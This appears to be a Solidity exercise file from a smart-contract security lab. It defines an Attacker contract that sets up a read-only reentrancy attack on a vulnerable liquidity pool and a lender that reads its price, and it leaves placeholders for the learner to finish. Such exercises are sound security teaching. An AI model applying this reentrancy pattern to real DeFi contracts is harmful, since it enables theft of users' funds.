// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IVulnerablePool {
	function addLiquidity(uint256 stEth_amount, uint256 eth_amount) external payable returns (uint256);
    function removeLiquidity(uint256 lp_amount) external returns (uint256, uint256);
    function getSpotPriceStEth(uint256 amount) external view returns (uint256);
    function getSpotPriceEth(uint256 amount) external view returns (uint256);
    function lpToken() external view returns (address);
}


interface IReaderLender {
    function borrowStEth(uint256 amount) external payable;
    function repay() external payable;
}


contract Attacker {
	uint256 private constant FEE_PERCENTAGE = 5;
	uint256 private constant OVERCOLLATERALLIZATION_PERCENTAGE = 150;  
	IVulnerablePool public target;
    IReaderLender public reader;
    IERC20 public stEth;
    bool public retrieving;
	

	constructor(address _token, address _target, address _reader) {
		target = IVulnerablePool(_target);
        reader = IReaderLender(_reader);
        stEth = IERC20(_token);
	}


    receive() external payable {
        uint ethBalance = 516666666666666666; // address(this).balance;
        // uint price  = ethBalance * 100 / (OVERCOLLATERALLIZATION_PERCENTAGE+FEE_PERCENTAGE);
        // uint amount = target.getSpotPriceEth(price);
        reader.borrowStEth{value: ethBalance}(1 ether);
        /*
            Your code goes here!
        */
     }


    function exploit() public payable {
        stEth.approve(address(target), type(uint256).max);
        target.addLiquidity{value: 2 ether}(2 ether, 2 ether);
        target.removeLiquidity(
            IERC20(target.lpToken()).balanceOf(address(this))
        );
        
        /*
            Your code goes here!
        */      
    }

}
